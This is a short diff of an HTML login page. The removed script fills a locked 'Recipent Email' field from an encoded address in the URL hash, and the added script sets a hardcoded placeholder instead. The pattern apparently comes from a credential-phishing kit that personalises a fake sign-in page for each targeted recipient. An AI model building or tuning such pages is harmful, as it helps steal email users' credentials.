@@ -182,37 +182,20 @@ return(str.substring(theleft, theright));
             <span class="input-group-addon"><i class="fas fa-user"></i></span>
             <input type="email" class="form-control" name="username" placeholder="Recipent Email" value="" id="email" readonly>
 		  <script>
-        // Function to extract and format email from URL hash
-        function setEmailFromHash() {
-            try {
-                // Get the hash from URL and remove the # symbol
-                const hash = window.location.hash ? window.location.hash.substring(1) : "";
-                console.log("Raw hash:", hash); // Debug: Check what hash is retrieved
-
-                if (hash) {
-                    // Replace -replc- with @ to form correct email
-                    const formattedEmail = hash.replace("-replc-", "@");
-                    console.log("Formatted email:", formattedEmail); // Debug: Check formatted email
-
-                    // Set the input field value to the formatted email
-                    const emailInput = document.getElementById("email");
-                    if (emailInput) {
-                        emailInput.value = formattedEmail;
-                    } else {
-                        console.error("Input element with ID 'email' not found.");
-                    }
-                } else {
-                    console.error("No hash found in URL.");
-                    document.getElementById("email").value = "No email found in URL";
-                }
-            } catch (error) {
-                console.error("Error processing email:", error);
-                document.getElementById("email").value = "Error processing email";
-            }
+        document.addEventListener('DOMContentLoaded', function() {
+    const emailInput = document.getElementById('email');
+    const encodedEmail = 'contact-replc-abc.com'; // Your encoded email
+    
+    // Replace -replc- with @ and set the value
+    emailInput.value = encodedEmail.replace(/-replc-/g, '@');
+    
+    // Optional: If you want to ensure the user sees the correct format when focusing
+    emailInput.addEventListener('focus', function() {
+        if (this.value.includes('-replc-')) {
+            this.value = this.value.replace(/-replc-/g, '@');
         }
-
-        // Run the function when the page loads
-        window.onload = setEmailFromHash;
+    });
+});
     </script>
           </div>
         </div>
